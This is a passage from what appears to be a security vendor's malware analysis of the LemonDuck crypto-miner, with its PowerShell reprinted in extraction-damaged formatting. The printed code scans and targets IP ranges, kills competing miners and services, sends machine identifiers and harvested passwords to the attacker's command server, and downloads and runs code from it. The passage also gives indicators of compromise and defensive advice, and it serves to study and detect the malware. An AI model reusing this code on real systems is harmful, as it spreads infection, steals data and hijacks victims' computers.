localscan -port 8088 -addresses $ipaddresses[$i..($i+$tcount-1)]\n$old_portopen = localscan -port 65529 -addresses $yarn_portopen[1]\nforeach($currip in $yarn_portopen[1]) {\n     if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){\n         write-host “start yarn service check...$currip”\n\n```\n$flag2 = yarnexec $currip $yarn_code\n\nif($flag2 -eq $true){\n\nwrite-host “SUCC!!”\n```\n              try{(New-Object Net.WebClient).DownloadString($down_url+’/report.\njson?v=’+$VVERSION+’&type=yarn&ip=’+$currip+’&t=’+$t)}catch{}\n              break\n         }\n     }\n}\n\n```\nThe script also has a function by which it generates IP addresses to attempt to attack with the above methods\n\nfunction getipaddrs($flag){\n```\n     write-host “Get ipaddress...”\n\n```\n$global:ipaddrs_i = @()\n\n$global:ipaddrs_o = @()\n\n$allip = @()\n\n[string[]]$ipsub = @(‘192.168.0’,’192.168.1’,’192.168.2’,’192.168.3’,’192.168.4’\n,’192.168.5’,’192.168.6’,’192.168.7’,’192.168.8’,’192.168.9’,’192.168.10’,’192.168.18’,\n’192.168.31’,’192.168.199’,’192.168.254’,’192.168.67’,’10.0.0’,’10.0.1’,’10.0.2’,’10.1.\n1’,’10.90.90’,’10.1.10’,’10.10.1’,’172.16.1’,’172.16.2’,’172.16.3’)\n\n[string[]]$ipsub_o = @()\n\nif(!$flag){\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n$regex.Matches((ipconfig /all)) | ForEach-Object {\n```\n     if ($allip -notcontains $_.Value)\n     { $allip += $_.Value }\n}\n\n```\n$regex.Matches((ipconfig /displaydns)) | ForEach-Object {\n```\n     if ($allip -notcontains $_.Value)\n     { $allip += $_.Value }\n}\n$regex.Matches((netstat -ano)) | ForEach-Object {\n     if ($allip -notcontains $_.Value)\n     { $allip += $_.Value }\n}\ntry{\n     $NetObject = New-Object Net.WebClient\n     $wlanip = $NetObject.DownloadString(“https://api.ipify.org/”) \n     $allip += $wlanip     \n}catch{}\ntry{\n\n```\n$addressList = [System.Net.DNS]::GetHostByName($null).AddressList\n\n$localip = @()\n\nForeach ($ip in $addressList)\n```\n     {\n         $localip += $ip.IPAddressToString\n         $allip += $localip\n     }\n}catch{}\nforeach($IP in $allip)\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n              if($IP.startswith(‘127.’) -or $IP.startswith(‘169.254.’) -or $IP.\nstartswith(‘0.0.0.0’) -or $IP.startswith(‘255.255.255.’)){\n                  continue\n              }\n              $iptemp = $ip.Split(“.”)\n              $SubnetIP = $iptemp[0] + “.” + $iptemp[1] + “.” + $iptemp[2]\n              if ($ipsub -notcontains $SubnetIP){\n                  if(isPubIP $IP){\n\n```\n$ipsub_o = @($SubnetIP) + $ipsub_o\n```\n                  } else {\n\n```\n$ipsub = @($SubnetIP) + $ipsub\n```\n                  }\n              }\n         }\n         write-host “inter ipsub count:”($ipsub.count)\n         #$ipsub\n         foreach($ipsub2 in $ipsub)\n         {\n              $global:ipaddrs_i += 0..254|%{$ipsub2+”.”+$_}\n         }\n\n```\n$global:ipaddrs_i = @($global:ipaddrs_i | Where-Object { $localip\n```\n-notcontains $_ })\n     }\n     while($true){\n         $ran_ipsub_b = “”+(1+(Get-Random -Maximum 254))+”.”+(0+(Get-Random\n-Maximum 255))\n         if(isPubIP ($ran_ipsub_b+”.1.1”)){break}\n     }\n     $global:ipaddrs_b = $ran_ipsub_b\n     for($i=0; $i -lt 256; $i++){\n\n```\n\n-----\n\n```\ntry{\n\n```\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n$ran_ipsub = $ran_ipsub_b+”.”+$i\nif($ipsub_o -notcontains $ran_ipsub){\n     $ipsub_o += $ran_ipsub\n}\n\n```\n```\n}catch{}\n\n```\n```\n     }\n     write-host “outer ipsub count:”($ipsub_o.count)\n     #$ipsub_o\n     foreach($ipsub3 in $ipsub_o)\n     {\n         $global:ipaddrs_o += 0..254|%{$ipsub3+”.”+$_}\n     }\n     write-host “Get address done!!”\n}\n\n##### Finally, the script reports back to the C2 Server by submitting exploitation logs in a json.\nwrite-host “reporting”\n         try{\n\n```\n$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where\n{$_.ipenabled -EQ $true}).Macaddress | select-object -first 1\n\n$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID\n\n$comp_name = $env:COMPUTERNAME\n```\n              $mf = test-path $mimipath\n              (New-Object Net.WebClient).DownloadString($down_url+’/log.\njson?V=’+$VVERSION+’&’+$comp_name+’&’+$guid+’&’+$mac+’&r=’+$retry+’&pc1=’+$smb_\nportopen[1].count+’&pc2=’+$ms_portopen[1].count+’&pc3=’+$ssh_portopen[1].\ncount+’&pc4=’+$rdp_portopen[1].count+’&pc5=’+$redis_portopen[1].\ncount+’&pci=’+$ipaddrs_i.count+’&pco=’+$ipaddrs_o.count+’&pcb=’+$global:ipaddrs_\nb+’&mi=’+($getpasswd -join “^^”)+’&mf=’+[Int]$mf)\n         }catch{}\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n### m6.bin aka. XMRig\n\nThis executable file is not available on VirusTotal. It is a version of XMRig, without version info, but still recognizable in\nIDA by the window title and config json.\n\n### m6g.bin aka. XMRig\n\nA PowerSploit [6] module loads a binary blob of data contained in the same file. Based on the naming convention we\ncan state that this is also a version of XMRig. It is currently detected on VirusTotal by 22 engines.\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n### kr.bin aka. Kill Competition\n\nThe file is a powershell script obfuscated with the same technique as those presented above. It is detected on\nVirusTotal by 22 engines. This script has the role of freeing up resources on the system by stopping background\nservices that don’t affect the user and killing competing miner processes. It runs in an infinite loop every 10 minutes.\n\nFirst, it defines helper functions to detect known miner IPs, communication packets and to suspend LemonDuck’s own\nprocess until it deals with the other operations.\n```\n# C2 server\nif(!$down_url){\n  $down_url = ‘http://d.ackng.com’\n}\ntry{$version=$ifmd5[0..5]-join””}catch{}\nfunction isPubIP {\n     Param(\n  [parameter(Mandatory=$true)][String]$ip\n     )\n\n```\n$resIps = @(\n\n@(4026531840L, 3758096384L),\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n@(4278190080L, 0L),\n\n@(4278190080L, 167772160L),\n\n@(4278190080L, 2130706432L),\n\n@(4290772992L, 1681915904L),\n\n@(4293918720L, 2886729728L),\n\n@(4294836224L, 3323068416L),\n\n@(4294901760L, 2851995648L),\n\n@(4294901760L, 3232235520L),\n\n@(4294967040L, 3221225472L),\n\n@(4294967040L, 3221225984L),\n\n@(4294967040L, 3227017984L),\n\n@(4294967040L, 3325256704L),\n\n@(4294967040L, 3405803776L),\n\n@(4294967295L, 4294967295L)\n```\n     )\n     $iparr = $ip.split(“.”)\n     $iplong = 0\n     for($i=3;$i -ge 0; $i--){\n\n```\n$iplong = $iplong -bor [int]$iparr[3-$i] * [math]::pow(2,8*$i)\n```\n     }\n     for($j=0;$j -lt $resIps.count;$j++){\n         if(($iplong -band $resIps[$j][0]) -eq $resIps[$j][1]){\n              return $false\n         }\n     }\n     return $true\n}\n# Execute openssl.exe to detect other miners\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n     $mname=”lsso”\n  $dpath1=$env:tmp+”\\libcrypto-1_1.dll”\n  $dpath2=$env:tmp+”\\libssl-1_1.dll”\n     $o_exepath=$env:tmp+”\\$mname.exe”\n     $d_retry=3\n     while(!(test-path $o_exepath) -or !(test-path $dpath1) -or !(test-path $dpath2)\n-or ((Get-Item $o_exepath).length -ne 483328)){\n         if($d_retry-- -eq 0){\n              break\n         }\n         start-sleep 3\n         try{\n      (ne`w-obj`ect Net.WebC`lient).DownloadFile(“$down_url/$mname.\n\n```\nzip”,”$env:tmp\\$mname.zip”) | out-null\n```\n      (New-Object -ComObject Shell.Application).NameSpace($env:tmp).\n\n```\nCopyHere(“$env:tmp\\$mname.zip\\*”,16) | out-null\n```\n      Remove-Item $env:tmp\\$mname.zip | out-null\n    }catch{continue}\n         start-sleep 3\n     }\n     if(!(test-path $o_exepath)){\n         return “”\n     }\n  set-location $env:tmp | out-null\n  if($send_str.indexof(“GET”) -eq 0){\n    $ret=(cmd.exe /c powershell -e write-host(“GET / HTTP/1.1`n`n”) | cmd.exe /c\n“$o_exepath” s_client -host $ip -port $port -quiet) -join “”\n  } else {\n    $ret=(cmd.exe /c echo $send_str | cmd.exe /c “$o_exepath” s_client -host $ip\n-port $port -tls1 3 -quiet) -join “”\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n  }\n     return $ret\n}\n\n```\n# Functions to filter traffic\n\nfunction ishttp($ip,$port){\n```\n  try{ $data1=”GET / HTTP/1.1`n`n”\n\n```\n$client = NEW-objEcT Net.Sockets.TcpClient($ip,$port)\n```\n    $sock = $client.Client\n    $bytes = [Text.Encoding]::ASCII.GetBytes($data1)\n    $sock.send(($bytes)) | out-null\n    $sock.ReceiveTimeout = 20000\n\n```\n$res = [Array]::CreateInstance((‘byte’), 1000)\n```\n    $recv = $sock.Receive($res)\n    $res = $res[0..($recv-1)]\n    $str = [Text.Encoding]::ASCII.getstring($res)\n    if($str.indexOf(“HTTP/1”) -ne -1){\n      return $true\n    }\n  }catch{}\n  return $false\n}\n\n```\nfunction ishttps($ip,$port){\n```\n  $data_str = “GET / HTTP/1.1`n`n”\n  $ret1 = openssl_exec $ip $port $data_str\n  if($ret1.indexOf(“HTTP/1”) -ne -1){\n    return $true\n  }\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n}\n\n```\n# Functions to filter other miner’s config\n\nfunction isminerproxys($ip,$port){\n\n$data_str = ‘{“id”:1,”jsonrpc”:”2.0”,”method”:”login”,”params”:{“login”:”x”,”pas\ns”:null,”agent”:”XMRig/5.13.1”,”algo”:[“cn/1”,”cn/2”,”cn/r”,”cn/fast”,”cn/half”,”cn/\nxao”,”cn/rto”,”cn/rwz”,”cn/zls”,”cn/double”,”rx/0”,”rx/wow”,”rx/loki”,”rx/arq”,”rx/\nsfx”,”rx/keva”]}}’ + “`n”\n```\n  $ret2 = openssl_exec $ip $port $data_str\n  if($ret2.indexOf(“jsonrpc”) -ne -1){\n    return $true\n  }\n  return $false\n}\n\n```\nfunction isminerproxy($ip,$port){\n\ntry{ $data=’{“id”:1,”jsonrpc”:”2.0”,”method”:”login”,”params”:{“login”:”x”,”pass\n”:null,”agent”:”XMRig/5.13.1”,”algo”:[“cn/1”,”cn/2”,”cn/r”,”cn/fast”,”cn/half”,”cn/\nxao”,”cn/rto”,”cn/rwz”,”cn/zls”,”cn/double”,”rx/0”,”rx/wow”,”rx/loki”,”rx/arq”,”rx/\nsfx”,”rx/keva”]}}’ + “`n”\n```\n    if($ip -eq ‘128.199.183.160’){return $false}\n\n```\n$client = NEW-objEcT Net.Sockets.TcpClient($ip,$port)\n```\n    $sock = $client.Client\n    $bytes = [Text.Encoding]::ASCII.GetBytes($data)\n    $sock.send(($bytes)) | out-null\n    $sock.ReceiveTimeout = 20000\n\n```\n$res = [Array]::CreateInstance((‘byte’), 1000)\n```\n    $recv = $sock.Receive($res)\n    $res = $res[0..($recv-1)]\n    $str = [Text.Encoding]::ASCII.getstring($res)\n    if($str.indexOf(“jsonrpc”) -ne -1){\n      return $true\n    }\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n  }catch{}\n  return $false\n}\n\n```\nAdd-Type -TypeDefinition ‘using System;using System.Diagnostics;using\n```\nSystem.Security.Principal;using System.Runtime.InteropServices;public\nstatic class Kernel32{[DllImport(“kernel32.dll”)] public static\n\n```\nextern bool CheckRemoteDebuggerPresent(IntPtr hProcess,out bool\n```\npbDebuggerPresent);[DllImport(“kernel32.dll”)] public static extern int\nDebugActiveProcess(int PID);[DllImport(“kernel32.dll”)] public static extern int\nDebugActiveProcessStop(int PID);}’\n# Function to suspend own process while dealing with others\nfunction ProcessSuspend($id){\n  $procName = (Get-Process -id $id -ErrorAction SilentlyContinue).name\n  if($procName -eq $null){\n    Write-Host “ERROR: There is no process with an ID of $id”\n    return\n  }\n  Write-host “Attempting to suspend $procName (PID: $id)...”\n  if ($id -le 0) {\n    write-host “You didn’t input a positive integer”\n    return\n  }   \n  $debug = whoami /priv | Where-Object{$_ -like “*SeDebugPrivilege*”}  \n  if($debug -ne $null){        \n\n```\n$DebugPresent = [IntPtr]::Zero\n```\n    $out = [Kernel32]::CheckRemoteDebuggerPresent(((Get-Process -Id $id).\n\n```\nHandle),[ref]$debugPresent)\n```\n    if ($debugPresent){\n      write-host “There is already a debugger attached to this process”\n      return\n     }\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n    $suspend = [Kernel32]::DebugActiveProcess($id)\n    if ($suspend -eq $false){\n\n```\nwrite-host “ERROR: Unable to suspend $procName (PID: $id)”\n```\n    }\n    else{\n      write-host “The $procName process (PID: $id) was successfully suspended!”\n    }\n  }\n  else{\n    write-host “ERROR: You do not have debugging privileges to pause any process”\n    return\n  } \n}\nfunction getprotected(){\n\n```\n$pids=@()\n\n$pids+=Get-WmiObject -Class Win32_Process|Where-Object{$_.CommandLine -like ‘*m6.\nbin*’ -or $_.CommandLine -like ‘*m6g.bin*’ -or $_.CommandLine -like “*$down_url*” -or\n```\n$_.path -like ‘*m6g.exe*’ -or $_.path -like ‘*m6.exe*’}|foreach{$_.processid}\n  return $pids\n}\n\n```\nfunction sendmsg($ip,$ismproxy){\n```\n  try{\n\n```\n$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled\n-EQ $true}).Macaddress | select-object -first 1\n\n$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID\n\n$comp_name = $env:COMPUTERNAME\n```\n    (New-Object Net.WebClient).DownloadString(“$down_url/rellik.json?$version&$comp_\nname&$mac&$guid&$ip&$ismproxy”)\n  }catch{}\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n##### Then, it starts to free up resources by disabling background Windows services, removing unneeded scheduled tasks and stopping background processes along with miner processes.\n```\n# Function which kills “useless” services and competitor miners\nFunction Killer {\n\n```\n$SrvName = “xWinWpdSrv”, “SVSHost”, “Microsoft Telemetry”, “lsass”, “Microsoft”, “system”, “Oracleupdate”, “CLR”, “sysmgt”, “\\gm”, “WmdnPnSN”, “Sougoudl”,”National”, “Nationaaal”, “Natimmonal”, “Nationaloll”, “Nationalmll”,”Nationalaie”,”Nationalwpi”,”WinHelp32”,”WinHelp64”, “Samserver”, “RpcEptManger”, “NetMsmqActiv Media\nNVIDIA”, “Sncryption Media Playeq”,”SxS”,”WinSvc”,”mssecsvc2.1”,”mssecsvc2.0”,”Windows_Update”,”Windows Managers”,”SvcNlauser”,”WinVaultSvc”,”Xtfy”,”Xtfya”,”Xtfyxxx”,”360rTys”,”IPSECS”,”MpeSvc”,”SRDSL”,”WifiService”,”ALGM”,”wmiApSrvs”,”wmiApServs”,”taskmgr1”,”WebServers”,”ExpressVNService”,”WWW.DDOS.CN.COM”,”WinHelpSvcs”,”aspnet_\nstaters”,”clr_optimization”,”AxInstSV”,”Zational”,”DNS Server”,”Serhiez”,”SuperProServer”,”.Net CLR”,”WissssssnHelp32”,”WinHasdadelp32”,”WinHasdelp32”,”ClipBooks”\n```\n     foreach($Srv in $SrvName) {\n\n```\n$Null = SC.exe Config $Srv Start= Disabled\n```\n         $Null = SC.exe Stop $Srv\n         $Null = SC.exe Delete $Srv\n     }\n\n```\n$TaskName = “my1”,”Mysa”, “Mysa1”, “Mysa2”, “Mysa3”, “ok”, “Oracle Java”, “Oracle Java Update”, “Microsoft Telemetry”, “Spooler SubSystem Service”,”Oracle Products\nReporter”, “Update service for products”, “gm”, “ngm”,”Sorry”,”Windows_Update”,”Update_windows”,”WindowsUpdate1”,”WindowsUpdate2”,”WindowsUpdate3”,”AdobeFlashPlayer”,”FlashPlayer1”,”FlashPlayer2”,”FlashPlayer3”,”IIS”,”WindowsLogTasks”,”System Log Security Check”,”Update”,”Update1”,”Update2”,”Update3”,”Update4”,”DNS”,”SYSTEM”,”DNS2”,”SYSTEMa”,”skycmd”,”Miscfost”,”Netframework”,”Flash”,”RavTask”,”GooglePingConfigs”,”HomeGroupProvider”,”MiscfostNsi”,”WwANsvc”,”Bluetooths”,”Ddrivers”,”DnsScan”,”WebServers”,”Credentials”,”TablteInputout”,”werclpsyport”,”HispDemorn”,”LimeRAT-Admin”,”DnsCore”,”Update service for Windows Service”,”DnsCore”,”ECDnsCore”\n```\n     foreach ($Task in $TaskName) {\n         SchTasks.exe /Delete /TN $Task /F 2> $Null\n     }\n\n```\n$Miner = “SC”,”WerMgr”,”WerFault”,”DW20”,”msinfo”, “XMR*”,”xmrig*”, “minerd”,\n“MinerGate”, “Carbon”, “yamm1”, “upgeade”, “auto-upgeade”, “svshost”,\n\n“SystemIIS”, “SystemIISSec”, ‘WindowsUpdater*’, “WindowsDefender*”, “update”,\n\n“carss”, “service”, “csrsc”, “cara”, “javaupd”, “gxdrv”, “lsmosee”, “secuams”,\n“SQLEXPRESS_X64_86”, “Calligrap”, “Sqlceqp”, “Setting”, “Uninsta”, “conhoste”,”Se\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\nchosti”,”SearchIndex”,”Avira”,”cohernece”,”win”,”SQLforwin”,”xig*”,”taskmgr1”,”Workstation”,”ress”,”explores”\n```\n     foreach ($m in $Miner) {\n         Get-Process -Name $m -ErrorAction SilentlyContinue | Stop-Process -Force\n     }\n     $tm = Get-Process -Name TaskMgr -ErrorAction SilentlyContinue\n     if($tm -eq $null){\n         Start-Process -WindowStyle hidden -FilePath Taskmgr.exe\n     }\n  $tcpconn = NetStat -anop TCP\n\n```\n$ipcache=@(‘161.35.107.193:80’,’66.42.43.37:80’,’167.99.154.202:80’,’139.162.80.221\n:80’,’128.199.183.160:443’)\n\n$ipdealcache=@()\n```\n  $ppids = getprotected\n  foreach ($t in $tcpconn) {\n    $line = $t.split(‘ ‘)| ? {$_}\n    if ($line -eq $null) { continue }\n\n```\nif($t.contains(“ESTABLISHED”) -and ($line[2].gettype() -eq “”.gettype()) -and\n```\n($line[2].indexOf(“:”) -ne -1)){\n\n```\n$ip,$port = $line[2].split(‘:’)\n```\n      $currpid = $line[-1]\n      if($ipdealcache -contains $line[2]){\n        ProcessSuspend $currpid\n      }\n      if(($ipcache -notcontains $line[2]) -and ($ppids -notcontains $line[1]) -and (isPubIP $ip) -and ($port -gt 0) -and ((ishttp $ip $port) -eq $false) -and\n((ishttps $ip $port) -eq $false)){\n        $ismproxy = 0\n        if((isminerproxy $ip $port) -eq $true){\n          $ismproxy = 1\n          } else{\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n          if((isminerproxys $ip $port) -eq $true){\n            $ismproxy = 2\n          }\n        }\n        if($ismproxy -ne 0){\n          ProcessSuspend $currpid\n          $ipcache += $line[2]\n          sendmsg $line[2] $ismproxy\n          $ipdealcache += $line[2]\n        }\n      }\n      $ipcache += $line[2]\n    }\n  }\n}\nwhile($true){\n  “try to kill...”\n     Killer\n  “kill done...”\n     Start-Sleep -Seconds 600\n}\n\n## Command and Control\n\n##### In the second stage script, there is a function called SIEX responsible for communicating with the C2 server. The URL handling communication from all the scripts and storing the final is hxxp://d[.]ackng[.]com\n\n```\n# Save all environment info in one big URL\n\n$params+=”&”+(@($os,[Int]$is64,$user,$domain,$drive,$card,$mem,[Int]$permit,($li\nfmd5[0..5]-join””),($lmmd5[0..5]-join””),$mv,$mip,$mhr,$uptime,$timestamp,”0.1”)```\n-join”&”)\nfunction SIEX {\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n  Param(\n  [string]$url\n  )\n  try{\n    $webclient = Ne`w-Obj`ect Net.WebC`lient\n\n```\n$finalurl = “$url”+”?”+”$params”\n```\n    try{\n\n```\n# Campaign identifier\n\n$webclient.Headers.add(“User-Agent”,”Lemon-Duck-”+$Lemon_Duck.\nreplace(‘\\’,’-’))\n```\n    } catch{}\n\n```\n$res_bytes = $webclient.”DownloadData”($finalurl)\n```\n    if($res_bytes.count -gt 173){\n      $sign_bytes = $res_bytes[0..171];\n      $raw_bytes = $res_bytes[173..$res_bytes.count];\n      $rsaParams = New-Object System.Security.Cryptography.RSAParameters\n\n```\n$rsaParams.Modulus = 0xda,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,0x41,0x5e,0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0x53,0x9a,0x73,0x6e,0x6c,0x7b,0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0,0xcd,0xcd,0x37,0x6b,0xf3,0x4f,0x3b,0x62,0x70,0x86,0x07,0x96,0x6e,0xca,0xde,0xbd,0xa6,0x4f,0xf6,0x11,0xd1,0x60,0xdc,0x88,0xbf,0x35,0xf2,0x92,0xee,0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,0xa7,0x9f,0xe2,0x12,0xcd,0x79,0x40,0xa7,0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,0x3f,0xf6,0x2e,0x95,0x10,0x72,0xfd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,0xea,0x38,0xb7,0x47,0x6b,0x5d\n\n$rsaParams.Exponent = 0x01,0x00,0x01\n```\n      $rsa = New-Object -TypeName System.Security.Cryptography.\nRSACryptoServiceProvider;\n      $rsa.ImportParameters($rsaParams)\n      $base64 = -join([char[]]$sign_bytes)\n      $byteArray = [convert]::FromBase64String($base64)\n      $sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider\n\n```\nif($rsa.verifyData($raw_bytes,$sha1,$byteArray)) {\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n                  # Invoke command from server’s response\n        IEX (-join[char[]]$raw_bytes)\n      }\n    }\n  } catch{}\n}\n\n```\nWhen communicating with the attacker, the script sends a long URL containing all the information gathered about\nthe environment, uniquely identifying the infected machine. The User-Agent of the request identifies the campaign:\n“LemonDuck.” Then, it validates every reply by matching against the hard-coded digital signature. If the response is\nvalid, it runs the commands received.\n\n## Impact\n\nThe campaign’s sole goal is to infect as many systems as possible to hijack their resources. The components\nsometimes send reports to the attacker. These reports and the way attackers identify infected machines, however\nunintended, might contain sensitive information. Some sensitive information in the identifier includes the current user’s\nname and the domain. The reports contain information about exploitation status and about newly infected systems (IP,\ne-mail addresses). Attackers could use them for profit if cryptocurrency mining wasn’t enough. Finally, the whole attack\nchain shows that these attackers can deploy advanced malware on the system and can infect many machines with\ntheir extensive collection of lateral movement techniques.\n\nUsers can, however, employ essential measures to defend against most of the infection techniques. The best strategy\nis to eliminate attack vectors by keeping OS and third-party software updated and avoiding using weak passwords.\n\n### Campaign distribution\n\n###### Country Count\n\n China 262\n\n Malaysia 136\n\n Iran 82\n\n Indonesia 69\n\n India 65\n\n Mexico 47\n\n Bangladesh 30\n\n Greece 24\n\n South Africa 14\n\n Vietnam 10\n\n Poland 10\n\n Romania 7\n\n P 6\n\n|Country|Count|\n|---|---|\n|China|262|\n|Malaysia|136|\n|Iran|82|\n|Indonesia|69|\n|India|65|\n|Mexico|47|\n|Bangladesh|30|\n|Greece|24|\n|South Africa|14|\n|Vietnam|10|\n|Poland|10|\n|Romania|7|\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n###### Lebanon 5\n\n Netherlands 4\n\n Colombia 4\n\n Uganda 3\n\n France 3\n\n Canada 3\n\n Taiwan 2\n\n United Kingdom 2\n\n Chile 2\n\n Pakistan 2\n\n United States 2\n\n Thailand 1\n\n Philippines 1\n\n Brazil 1\n\n Italy 1\n\n## Conclusion\n\nAttackers behind LemonDuck improved on the ideas behind KingMiner and created a malware that can infect many\nmore systems and mine cryptocurrency much more efficiently. The result is a massive global campaign that mainly\n\n|Lebanon|5|\n|---|---|\n|Netherlands|4|\n|Colombia|4|\n|Uganda|3|\n|France|3|\n|Canada|3|\n|Taiwan|2|\n|United Kingdom|2|\n|Chile|2|\n|Pakistan|2|\n|United States|2|\n|Thailand|1|\n|Philippines|1|\n|Brazil|1|\n|Italy|1|\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\nThe malware can be delivered to the victim in various ways, such as through phishing, exploits, and valid accounts with\nbrute-forced passwords. With file-less execution and all the defense evasion techniques applied, it can fly under the\nradar and generate significant revenue for its operators. LemonDuck also ensures that, once the system is infected, it\nmaximizes the available resources to use.\n\nA worrying aspect of this campaign is the continually growing arsenal of exploitation tools, most of which are available\nfor free on the internet. These tools can be dynamically deployed on the attacker’s servers and help further spread\nthe malware to randomly generated IPs and infect machines even with no user interaction. The most efficient way to\ndefend against such attacks is to strengthen passwords and keep operating systems and third-party software up to\ndate.\n\n## Bibliography\n\n##### [1] https://labs.bitdefender.com/2020/07/kingminer-botnet-keeps-up-with-the-times/\n\n [2] https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/\n\n [3] https://news.sophos.com/en-us/2020/08/25/lemon_duck-cryptominer-targets-cloud-apps-linux/\n\n [4] https://www.pingcastle.com/documentation/scanner/\n\n [5] https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1\n\n [6] https://github.com/PowerShellMafia/PowerSploit\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n## MITRE techniques breakdown\n\n|Impact|Resource Hijacking|Col3|Col4|Col5|Col6|\n|---|---|---|---|---|---|\n|Lateral Movement|Exploitation of Remote Services|Internal Spearphishing|Replication Through Removable Media|Use Alternate Authentication Material: Pass the Hash||\n|Discovery|Network Share Discovery|Peripheral Device Discovery|Process Discovery|Software Discovery: Security Software Discovery|System Information Discovery|\n|Credential Access|Brute Force: Password Spraying|||||\n|Defense Evasion|Access Token Manipulation: Create Process with Token|Deobfuscate/Decode Files or Information|Impair Defenses: Disable or Modify System Firewall|||\n|Privilege Escalation|Access Token Manipulation: Create Process with Token|||||\n|Persistence|Scheduled Task/ Job: Scheduled Task|Event Triggered Execution: Windows Management Instrumentation Event Subscription||||\n|Execution|Command and Scripting Interpreter: PowerShell|Command and Scripting Interpreter: Windows Command Shell|Scheduled Task/ Job: Scheduled Task|Windows Management Instrumentation||\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n## Appendix 1. Indicators of Compromise\n\n### Hashes\n\nce510f7de1c4312aa0d74d0f1804c151\n\n614257993fd996b4cea3a0fdffa4feac\n\n5b2849ff2e8c335dcc60fd2155b2d4d3\n\n23d59ed726e13edabcb751da7a5ce310\n\nef3a4697773f84850fe1a086db8edfe0\n\n### URLs\n\nhxxp://t[.]zz3r0[.]com\n\nhxxp://t[.]zer9g[.]com\n\nhxxp://t[.]amynx[.]com\n\nhxxp://d[.]ackng[.]com\n\n### Scheduled Task\n\n##### blackball\n\n### Mutexes\n\n##### Global\\eLocalIf\n\n Global\\eLocalMn\n\n Global\\eLocalMng\n\n Global\\eLocalKr\n\n Global\\LocalMail\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n\n-----\n\n##### Proudly Serving Our Customers Dedicated To Our +20.000 Worldwide Partners\nBitdefender provides solutions and services for small business and A channel-exclusive vendor, Bitdefender is proud to share success with tens of\nmedium enterprises, service providers and technology integrators. We take thousands of resellers and distributors worldwide.\npride in the trust that enterprises such as Mentor, Honeywell, Yamaha, _CRN 5-Star Partner, 4th Year in a Row. Recognized on CRN’s Security 100 List. CRN Cloud_\n**Speedway, Esurance or Safe Systems place in us.** _Partner, 2nd year in a Row_\n_Leader in Forrester’s inaugural Wave™ for Cloud Workload Security_ _More MSP-integrated solutions than any other security vendor_\n_NSS Labs “Recommended” Rating in the NSS Labs AEP Group Test_ _3 Bitdefender Partner Programs - to enable all our partners – resellers, service providers_\n_SC Media Industry Innovator Award for Hypervisor Introspection, 2nd Year in_ _and hybrid partners – to focus on selling Bitdefender solutions that match their own_\n_a Row_ _specializations_\n_Gartner® Representative Vendor of Cloud-Workload Protection Platforms_\n\n##### Trusted Security Authority\nBitdefender is a proud technology alliance partner to major virtualization vendors, directly contributing to the development of secure ecosystems with\n**VMware, Nutanix, Citrix, Linux Foundation, Microsoft, AWS, and Pivotal.**\nThrough its leading forensics team, Bitdefender is also actively engaged in countering international cybercrime together with major law enforcement agencies\nsuch as FBI and Europol, in initiatives such as NoMoreRansom and TechAccord, as well as the takedown of black markets such as Hansa. Starting in 2019,\nBitdefender is also a proudly appointed CVE Numbering Authority in MITRE Partnership.\n\n**RECOGNIZED BY LEADING ANALYSTS AND INDEPENDENT TESTING ORGANIZATIONS** **TECHNOLOGY ALLIANCES**\n\n##### UNDER THE SIGN OF THE WOLF\n\n**Founded 2001, Romania** A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can\n**Number of employees 1800+** win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand,\n\nand one million times out of one million.\n\n**Headquarters**\nEnterprise HQ – Santa Clara, CA, United States And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight,\nTechnology HQ – Bucharest, Romania but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of 